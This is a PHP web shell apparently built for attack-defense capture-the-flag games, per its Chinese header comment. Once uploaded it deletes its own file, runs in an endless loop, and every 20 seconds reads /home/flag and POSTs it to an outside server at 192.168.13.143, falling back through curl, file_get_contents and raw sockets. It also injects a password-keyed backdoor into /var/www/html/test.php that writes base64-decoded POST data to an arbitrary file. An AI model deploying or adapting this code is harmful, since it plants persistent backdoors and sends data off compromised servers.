<?php
    /*
    无文件网马，上传访问之后立即自我删除
    每隔一段时间向服务器发送flag

    参数：
    PLAGPATH 获取flag的路径
    INTERVAL 获取flag时间间隔 秒
    SERVERPP 服务端接受flag的地址
    NEEDLE   服务端返回正常必然含有的字符串
    POSTPARA post参数
    DOBACKWORK 是否写入后门
    BACKFILE 后门文件
    BACKFUZZ 额外的标志头
    BACKKEY  后门口令
    NEWBACKNAME 复活后的文件
    */
?>
<?php
    define("PLAGPATH", "/home/flag");
    define("INTERVAL", 20);
    define("NEEDLE", "Nice job");
    define("POSTPARA", "hlkg");
    define("SERVERPP", "http://192.168.13.143/server.php");
    define("DOBACKWORK", true);
    define("BACKFILE", "/var/www/html/test.php");
    define("BACKFUZZ", "ADJNKCXNCABHBKC");
    define("BACKKEY", "fladdy33");
    define("NEWBACKNAME", "/var/www/html/hoho.php");

    function post1($url, $post_data = '', $timeout = 5){//curl
        if(!function_exists('curl_init')) return '';
        $ch = curl_init();
        curl_setopt ($ch, CURLOPT_URL, $url);
        curl_setopt ($ch, CURLOPT_POST, 1);
        if($post_data != ''){
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        }
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $file_contents = curl_exec($ch);
        curl_close($ch);
        return $file_contents;
    }

    function post2($url, $post) {
        if(!function_exists('stream_context_create')) return '';
        $options = array(
            'http' => array(
                'method' => 'POST',
                'content' => $post,
            ),
        );
        $result = file_get_contents($url, false, stream_context_create($options));
        return $result;
    }

    function post3($url, $post) {
        if(!function_exists('fsockopen')) return '';
        $urls = parse_url($url);
        if (!isset($urls['port'])) {
            $urls['port'] = 80;
        }

        $fp = fsockopen($urls['host'], $urls['port'], $errno, $errstr);
        if (!$fp) {
            //echo "$errno, $errstr";
            return "";
        }

        $length = strlen($post);
        $header = "POST ".$urls['path']." HTTP/1.1\r\n";
        $header .= "Host: ".$urls['host']."\r\n";
        $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $header .= "Content-Length: ".$length."\r\n";
        $header .= "Connection: close\r\n\r\n";
        $header .= $post;

        fwrite($fp, $header);
        $result = '';
        while (!feof($fp)) {
            $result .= fread($fp, 512);
        }
        $result = explode("\r\n\r\n", $result, 2);
        return $result[1];
    }

    function backpack() {
      if(!DOBACKWORK) return;
      $fc = file_get_contents(BACKFILE);
      if(strpos($fc, BACKFUZZ) !== false) return;
      $fuzz = BACKFUZZ;
      $writekey = BACKKEY;
      $fname = NEWBACKNAME;
      $filedata =
<<<sql
<?php
  define("$fuzz", 1);
  define("KEY", "$writekey");
  define("FNAME", "$fname");
sql;
      $filedata .=
<<<'thanks'
  if(isset($_POST[KEY])) file_put_contents(FNAME, base64_decode($_POST[KEY]));
thanks;
      $filedata .= "?>\n";
      file_put_contents(BACKFILE, $filedata.$fc);
    }

    //error_reporting(E_ALL);
    //ini_set('display_errors', '1');
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);

    while(1) {
        $plag = file_get_contents(PLAGPATH);
        $plag = trim($plag);
        $plag = trim($plag, '\n');
        $fine = false;

        try {
          $c = post1(SERVERPP, POSTPARA."=".$plag);
          if(strpos($c, NEEDLE) !== false) $fine = true;
        } catch (Exception $e) {
          ;
        }
        if($fine == false) {
          try {
            $c = post2(SERVERPP, POSTPARA."=".$plag);
            if(strpos($c, NEEDLE) !== false) $fine = true;
          } catch (Exception $e) {
            ;
          }
        }
        if($fine == false) {
          try {
            $c = post3(SERVERPP, POSTPARA."=".$plag);
            if(strpos($c, NEEDLE) !== false) $fine = true;
          } catch (Exception $e) {
            ;
          }
        }

        try {
          backpack();
        } catch (Exception $e) {
          ;
        }
        sleep(INTERVAL);
    }
?>
